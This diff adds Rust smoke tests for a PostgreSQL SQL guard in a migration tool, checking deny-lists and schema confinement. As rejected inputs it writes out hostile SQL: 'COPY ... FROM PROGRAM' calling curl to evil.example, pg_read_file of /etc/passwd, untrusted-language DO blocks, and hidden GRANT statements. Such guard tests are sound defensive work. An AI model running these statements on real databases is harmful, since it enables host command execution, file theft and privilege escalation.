@@ -1,0 +1,466 @@
+//! Focused public-API smoke tests for this vendor's SQL guard.
+//!
+//! The exhaustive guard behaviour-lock suite (Platform widening, vendor
+//! lowering, the data-security IR gate) lives in the engine crate, because those
+//! scenarios drive the guard THROUGH the engine's `render::lower` / `conn` apply
+//! pipeline (which this backend crate deliberately cannot depend on). These smoke
+//! tests pin the guard's own public surface: the confined deny-list, the
+//! cross-schema confinement, the string-literal extractor, and the analysis
+//! re-exports.
+
+mod support;
+
+use zero_migrate_backend::guard::{GuardConfig, GuardError};
+use zero_migrate_ir::dialect::DialectId;
+use zero_migrate_ir::policy::SchemaScope;
+use zero_migrate_postgres::guard::{check_raw_view_body_text, extract_string_literals, SqlGuard};
+use zero_migrate_postgres::DIALECT as POSTGRES;
+
+const DUCKDB: DialectId = DialectId::new("duckdb");
+
+fn confined() -> SqlGuard {
+    SqlGuard::new(GuardConfig::from_policy(
+        support::no_inject("app1"),
+        POSTGRES,
+    ))
+}
+
+#[test]
+fn explicit_confined_charter_fixture_composes() {
+    let cfg = GuardConfig::from_policy(support::confined_charter(), POSTGRES);
+    assert_eq!(
+        cfg.schema_scope(),
+        Some(SchemaScope::Single("app".to_string()))
+    );
+}
+
+/// Retargeting a config carries the composed policy across unchanged: `for_dialect`
+/// selects WHICH backend vets the SQL, never WHAT the policy grants.
+///
+/// It used to assert a second thing alongside - that a host-set belt-off mode
+/// survived onto PostgreSQL and was reset to `Enforced` for every other id. Both
+/// halves of that are gone with the mode itself: there is no belt-off posture to
+/// carry, so nothing to reset and nothing a future backend could inherit. The
+/// policy-preservation half is unchanged and is what remains here.
+#[test]
+fn dialect_selection_preserves_the_composed_policy() {
+    let cfg = GuardConfig::from_policy(support::no_inject("app1"), POSTGRES);
+
+    let postgres = cfg.clone().for_dialect(POSTGRES);
+    assert_eq!(postgres.dialect(), &POSTGRES);
+    assert_eq!(
+        postgres.schema_scope(),
+        Some(SchemaScope::Single("app1".to_string()))
+    );
+
+    let sqlite = cfg.clone().for_dialect(DialectId::new("sqlite"));
+    assert_eq!(sqlite.dialect(), &DialectId::new("sqlite"));
+    assert_eq!(
+        sqlite.schema_scope(),
+        Some(SchemaScope::Single("app1".to_string()))
+    );
+
+    let future = cfg.for_dialect(DUCKDB);
+    assert_eq!(future.dialect(), &DUCKDB);
+    assert_eq!(
+        future.schema_scope(),
+        Some(SchemaScope::Single("app1".to_string()))
+    );
+}
+
+#[test]
+fn postgres_raw_guard_fails_closed_for_a_future_backend_id() {
+    let guard = SqlGuard::new(GuardConfig::from_policy(support::no_inject("app1"), DUCKDB));
+
+    let err = guard
+        .check("CREATE TABLE app1.widgets (id int)")
+        .expect_err("PostgreSQL's parser must not vet a future backend's raw SQL");
+    assert_eq!(err, GuardError::RawSqlRejected { dialect: DUCKDB });
+
+    let err = guard
+        .check_raw_island_sql_backstop("SELECT 1")
+        .expect_err("the raw-island backstop must fail closed for a future backend");
+    assert_eq!(err, GuardError::RawSqlRejected { dialect: DUCKDB });
+
+    let err = guard
+        .check_raw_island_body_backstop("SELECT 1", "future-backend function body")
+        .expect_err("the raw-body backstop must fail closed for a future backend");
+    assert_eq!(err, GuardError::RawSqlRejected { dialect: DUCKDB });
+}
+
+#[test]
+fn raw_view_scanner_evaluates_schema_scope_without_a_policy_fixture() {
+    let scope = SchemaScope::Single("app1".to_string());
+    check_raw_view_body_text("SELECT * FROM app1.widgets", "view body", Some(&scope))
+        .expect("the explicit scope admits its own schema");
+
+    let err = check_raw_view_body_text("SELECT * FROM other.widgets", "view body", Some(&scope))
+        .expect_err("the explicit scope rejects another schema");
+    assert!(matches!(err, GuardError::CrossSchema { .. }));
+
+    let err = check_raw_view_body_text("SELECT pg_read_file('/etc/passwd')", "view body", None)
+        .expect_err("the body deny-list remains active without schema confinement");
+    assert!(matches!(err, GuardError::Denied { .. }));
+}
+
+#[test]
+fn confined_allows_a_plain_create_table() {
+    let report = confined()
+        .check("CREATE TABLE app1.widgets (id int)")
+        .expect("a plain confined-schema CREATE TABLE must pass the guard");
+    assert!(!report.destructive, "CREATE TABLE is not destructive");
+}
+
+#[test]
+fn confined_denies_a_copy_program_rce() {
+    // `COPY ... FROM PROGRAM` is arbitrary host command execution - the deny-list
+    // must reject it under the confined (creator/AI) posture.
+    let err = confined()
+        .check("COPY app1.t FROM PROGRAM 'curl evil.example'")
+        .expect_err("COPY FROM PROGRAM is RCE and must be denied");
+    assert!(
+        matches!(err, GuardError::Denied { .. }),
+        "expected a hard Denied, got {err:?}"
+    );
+}
+
+#[test]
+fn confined_flags_a_drop_table_as_destructive() {
+    let report = confined()
+        .check("DROP TABLE app1.widgets")
+        .expect("DROP TABLE is reversible-structure destructive, not denied outright");
+    assert!(report.destructive, "DROP TABLE must be flagged destructive");
+}
+
+#[test]
+fn confined_denies_a_cross_schema_reference() {
+    let err = confined()
+        .check("CREATE TABLE other_tenant.secrets (id int)")
+        .expect_err("a non-confined schema reference is a cross-tenant violation");
+    assert!(
+        matches!(
+            err,
+            GuardError::CrossSchema { .. } | GuardError::Denied { .. }
+        ),
+        "expected a cross-schema/deny error, got {err:?}"
+    );
+}
+
+#[test]
+fn extract_string_literals_is_multibyte_faithful() {
+    let lits = extract_string_literals("SELECT 'héllo', 'wörld'");
+    assert_eq!(lits, vec!["héllo".to_string(), "wörld".to_string()]);
+}
+
+#[test]
+fn non_ascii_relation_name_reaches_a_verdict_instead_of_panicking() {
+    // The `pg_` catalog-prefix test byte-sliced `relname[..3]` behind a byte-length
+    // check, so an identifier whose third byte fell inside a multi-byte character
+    // aborted the process before any allow/deny decision. A guard that panics on
+    // untrusted input fails open by taking the caller down with it, so every
+    // well-formed UTF-8 identifier must produce a verdict.
+    let guard = confined();
+    for sql in [
+        r#"SELECT * FROM "abé""#,
+        r#"SELECT * FROM "a日本""#,
+        r#"INSERT INTO "abé" VALUES (1)"#,
+        r#"CREATE TABLE app1."abé" (x int)"#,
+        r#"SELECT 1; SELECT * FROM "abé""#,
+    ] {
+        let _ = guard.check(sql);
+    }
+}
+
+#[test]
+fn analysis_reexports_are_reachable() {
+    // This vendor owns the analyzers now; assert they resolve at its own paths.
+    let advisories =
+        zero_migrate_postgres::analysis::analyze::analyze("CREATE INDEX i ON app1.t (a)");
+    let _ = advisories; // shape-only: analysis never denies.
+    let classified = zero_migrate_postgres::analysis::classify::classify("SELECT 1");
+    assert!(
+        classified.is_ok(),
+        "a plain SELECT must classify without a parse error"
+    );
+}
+
+#[test]
+fn renaming_a_role_database_or_foreign_schema_is_denied() {
+    // `RenameStmt` is one node for `ALTER <anything> RENAME TO`, and role, database,
+    // and schema renames carry their target in scalar slots the cross-schema walk
+    // never visits. Reaching a verdict only for TABLE and COLUMN let a rename confer
+    // exactly what the other spellings hard-deny.
+    let g = confined();
+    for sql in [
+        "ALTER ROLE postgres RENAME TO pwned",
+        "ALTER USER app1 RENAME TO postgres",
+        "ALTER DATABASE postgres RENAME TO pwned",
+        // Renaming a schema you do not own takes it away.
+        "ALTER SCHEMA control RENAME TO app_stolen",
+        // Renaming your own onto a name you do not own claims that one.
+        "ALTER SCHEMA app1 RENAME TO control",
+    ] {
+        let err = g
+            .check(sql)
+            .expect_err(&format!("must not be admitted: {sql}"));
+        assert!(
+            matches!(
+                err,
+                GuardError::Denied { .. } | GuardError::CrossSchema { .. }
+            ),
+            "expected a deny/cross-schema verdict for `{sql}`, got {err:?}"
+        );
+    }
+
+    // A rename that names its target through `relation` was already covered, and a
+    // table rename inside the owned schema must still pass.
+    g.check("ALTER TABLE app1.widgets RENAME TO gadgets")
+        .expect("an owned-schema table rename stays allowed");
+}
+
+#[test]
+fn a_scope_owning_no_schema_permits_no_schema() {
+    // `GuardConfig::schema_scope` returns `Single("")` for a policy that owns no
+    // schema at all, which is the tightest posture there is. The body scanner kept
+    // its own copy of the admission match, and that copy had an extra arm treating
+    // the empty name as "permit everything" - so the one policy that should admit
+    // nothing admitted every cross-tenant reference.
+    let owns_nothing = SchemaScope::Single(String::new());
+    for body in [
+        "SELECT * FROM control.users",
+        "SELECT * FROM other_tenant.secrets",
+        "SELECT * FROM app1.widgets",
+    ] {
+        let err = check_raw_view_body_text(body, "view body", Some(&owns_nothing))
+            .expect_err(&format!("owning no schema must not admit: {body}"));
+        assert!(
+            matches!(err, GuardError::CrossSchema { .. }),
+            "expected a cross-schema verdict for `{body}`, got {err:?}"
+        );
+    }
+
+    // Permitting everything stays available, but only by asking for it.
+    check_raw_view_body_text(
+        "SELECT * FROM control.users",
+        "view body",
+        Some(&SchemaScope::Unconfined),
+    )
+    .expect("an explicit Unconfined posture still admits any schema");
+}
+
+#[test]
+fn an_anonymous_block_in_an_untrusted_language_is_denied() {
+    // `DO [LANGUAGE lang] $$..$$` executes an anonymous block in an arbitrary
+    // procedural language, so it carries the same RCE reach as `CREATE FUNCTION`.
+    // `DO` sat in the unconditionally-safe statement list and never had its language
+    // read, so the block spelling was admitted while the function spelling of the
+    // same body was denied.
+    let g = confined();
+    for sql in [
+        "DO LANGUAGE plpythonu $$ import os $$",
+        "DO LANGUAGE plperlu $$ system(\"id\"); $$",
+        // Quoting the language name must not evade the check.
+        "DO LANGUAGE \"plpythonu\" $$ import os $$",
+    ] {
+        let err = g
+            .check(sql)
+            .expect_err(&format!("untrusted language must be denied: {sql}"));
+        assert!(
+            matches!(err, GuardError::Denied { .. }),
+            "expected a hard Denied for `{sql}`, got {err:?}"
+        );
+    }
+
+    // An absent LANGUAGE is plpgsql, which is trusted and stays allowed.
+    g.check("DO $$ BEGIN NULL; END $$")
+        .expect("a plain plpgsql block stays allowed");
+}
+
+#[test]
+fn a_bare_schema_name_is_confined_in_reindex_and_comment() {
+    // `REINDEX SCHEMA <s>` and `COMMENT ON SCHEMA <s>` carry their target as a bare
+    // string rather than a relation or a qualified list, which is the one slot shape
+    // the cross-schema walk does not visit. Both statement kinds sat in the
+    // unconditionally-safe list, so they reached any schema at all.
+    //
+    // REINDEX is the one that bites: rebuilding every index in a schema you do not own
+    // takes an ACCESS EXCLUSIVE lock on each of its tables, so it is a cross-tenant
+    // outage, not just a metadata write.
+    let g = confined();
+    for sql in ["REINDEX SCHEMA control", "COMMENT ON SCHEMA control IS 'x'"] {
+        let err = g
+            .check(sql)
+            .expect_err(&format!("a foreign schema must not be reachable: {sql}"));
+        assert!(
+            matches!(err, GuardError::CrossSchema { .. }),
+            "expected a cross-schema verdict for `{sql}`, got {err:?}"
+        );
+    }
+
+    // `REINDEX DATABASE` / `REINDEX SYSTEM` reach past any schema at all.
+    let err = g
+        .check("REINDEX DATABASE postgres")
+        .expect_err("a database-wide reindex is out of a project migrator's remit");
+    assert!(matches!(err, GuardError::Denied { .. }), "got {err:?}");
+
+    // The owned schema stays reachable through both.
+    g.check("REINDEX SCHEMA app1")
+        .expect("reindexing the owned schema stays allowed");
+    g.check("COMMENT ON SCHEMA app1 IS 'x'")
+        .expect("commenting on the owned schema stays allowed");
+}
+
+#[test]
+fn a_body_hiding_a_privilege_verb_is_denied() {
+    // The body token scan is the backstop for PL/pgSQL text that never parses as
+    // top-level SQL. It carried needles for `CREATE ROLE` and friends but none for
+    // the privilege verbs the top level also hard-denies, so `GRANT` hidden in
+    // EXECUTE text passed while `CREATE ROLE` in the same shape was caught.
+    let g = confined();
+    for sql in [
+        "DO $$ BEGIN EXECUTE 'GRANT ALL ON app1.t ' || 'TO PUBLIC'; END $$",
+        "DO $$ BEGIN EXECUTE 'REVOKE ALL ON app1.t ' || 'FROM app1'; END $$",
+        "DO $$ BEGIN EXECUTE 'ALTER FUNCTION app1.f() SECURITY DEFINER'; END $$",
+        "DO $$ BEGIN EXECUTE 'ALTER DEFAULT PRIVILEGES GRANT ALL ON TABLES TO PUBLIC'; END $$",
+    ] {
+        let err = g
+            .check(sql)
+            .expect_err(&format!("a hidden privilege verb must be denied: {sql}"));
+        assert!(
+            matches!(err, GuardError::Denied { .. }),
+            "expected a hard Denied for `{sql}`, got {err:?}"
+        );
+    }
+
+    // Identifier boundaries, so an ordinary column name carrying a needle as a
+    // substring does not trip the scan.
+    g.check("CREATE TABLE app1.t (grant_total int, revoked_at timestamptz)")
+        .expect("a column named grant_total is not a GRANT");
+}
+
+/// A schema you cannot CREATE, you also cannot DROP.
+///
+/// `grants_drop_object` answered `ObjectSchema` with a GLOBAL `schema.create_schema`
+/// query that never looked at which schema was being dropped, while `CreateSchemaStmt`
+/// checks the name at its target. Under a charter granting `create_schema` over `all`
+/// with `cross_schema` scoped - the shape this engine's own operator fixture builds -
+/// that let a migration drop a schema it was refused permission to create.
+///
+/// The name is a bare single-part String in `DropStmt.objects`, and the cross-schema
+/// walk needs 2+ parts, so nothing downstream caught it either.
+#[test]
+fn a_foreign_schema_cannot_be_dropped_even_when_create_schema_is_global() {
+    // The shape this repo's own operator fixture builds: create_schema granted
+    // globally, cross_schema scoped to the owned set.
+    let charter = r#"policy_version = 1
+[[grant]]
+key = "schema.cross_schema"
+value = true
+scope = { include = ["app1"] }
+[[grant]]
+key = "schema.create_schema"
+value = true
+scope = "all"
+[[grant]]
+key = "safety.destructive_ops"
+value = "allow"
+scope = "all"
+"#;
+    let g = SqlGuard::new(GuardConfig::from_policy(
+        support::effective_policy_from_charter_toml(charter),
+        POSTGRES,
+    ));
+    for sql in [
+        "DROP SCHEMA control CASCADE",
+        // One owned name in the list does not launder the foreign one.
+        "DROP SCHEMA control, app1 CASCADE",
+    ] {
+        let err = g
+            .check(sql)
+            .expect_err(&format!("a foreign schema must not be droppable: {sql}"));
+        assert!(
+            matches!(err, GuardError::CrossSchema { .. }),
+            "expected a cross-schema verdict for `{sql}`, got {err:?}"
+        );
+    }
+
+    // The asymmetry that made this a bug rather than a posture: create was already
+    // confined at its target.
+    let err = g
+        .check("CREATE SCHEMA control")
+        .expect_err("creating a foreign schema was already refused");
+    assert!(matches!(err, GuardError::CrossSchema { .. }), "got {err:?}");
+
+    // Dropping the owned schema stays allowed, and stays flagged destructive.
+    let report = g
+        .check("DROP SCHEMA app1 CASCADE")
+        .expect("dropping the owned schema stays allowed");
+    assert!(report.destructive, "DROP SCHEMA must remain destructive");
+}
+
+/// The body scanner reaches RENAME COLUMN handling through a bare string literal, and
+/// its injected-shape rule cannot fire when it gets there.
+///
+/// `check_body_text` re-parses every single-quoted fragment as SQL and recurses into
+/// `check_node`, so a literal reaches the rename checks even though a raw view body is
+/// refused unless it is a single top-level SELECT (`validate_raw_view_body_sql`, in
+/// `zero-migrate-core`'s `model::validate`). The cross-schema arm is the
+/// positive control: it proves the literal really is walked rather than ignored, which
+/// is what makes the permissive arm below a statement about the rule and not about
+/// whether the code runs.
+#[test]
+fn a_rename_inside_a_view_body_literal_is_walked_but_never_meets_the_injected_rule() {
+    let scope = SchemaScope::Single("app1".to_string());
+
+    // Positive control: the literal IS parsed and routed to the rename checks.
+    let err = check_raw_view_body_text(
+        "SELECT 'ALTER TABLE other.widgets RENAME COLUMN tenant_id TO t'",
+        "view body",
+        Some(&scope),
+    )
+    .expect_err("a rename inside a literal is walked, so its cross-schema arm fires");
+    assert!(matches!(err, GuardError::CrossSchema { .. }));
+
+    // Same shape inside the scope's own schema: admitted. `BodyScopeDecisions`
+    // answers "not injected" for every element, so the immutability rule that would
+    // otherwise protect a charter-injected column is not consulted here.
+    check_raw_view_body_text(
+        "SELECT 'ALTER TABLE app1.widgets RENAME COLUMN tenant_id TO t'",
+        "view body",
+        Some(&scope),
+    )
+    .expect("the body scanner admits a rename of an injected column under body scope");
+}
+
+/// The public body scanner refuses text that is not a view body at all.
+///
+/// It answers "not injected" for every element, so its rename rules cannot fire. That
+/// answer is only sound for text which cannot carry a rename, which is why the scanner
+/// checks the shape itself rather than trusting its caller to have done so. Before that
+/// check existed, a bare `ALTER TABLE ... RENAME COLUMN` handed straight to this function
+/// was ADMITTED.
+///
+/// The engine's own path is unaffected: `validate_raw_view_body_sql`
+/// (crates/zero-migrate-core/src/model/validate.rs) refuses the same shapes first, with the
+/// authoring diagnostics this layer has no context to produce.
+#[test]
+fn the_public_body_scanner_refuses_text_that_is_not_a_view_body() {
+    let scope = SchemaScope::Single("app1".to_string());
+
+    for body in [
+        "ALTER TABLE app1.widgets RENAME COLUMN tenant_id TO t",
+        "SELECT 1; SELECT 2",
+        "INSERT INTO app1.widgets (id) VALUES (1)",
+    ] {
+        let err = check_raw_view_body_text(body, "view body", Some(&scope))
+            .expect_err("a view body must be exactly one top-level SELECT");
+        assert!(
+            matches!(&err, GuardError::Denied { rule, .. } if *rule == "view_body_not_a_select"),
+            "{body:?} must be refused as not-a-view-body, got {err:?}"
+        );
+    }
+
+    // The shape it exists to admit still passes.
+    check_raw_view_body_text("SELECT * FROM app1.widgets", "view body", Some(&scope))
+        .expect("a single top-level SELECT is what a view body is");
+}
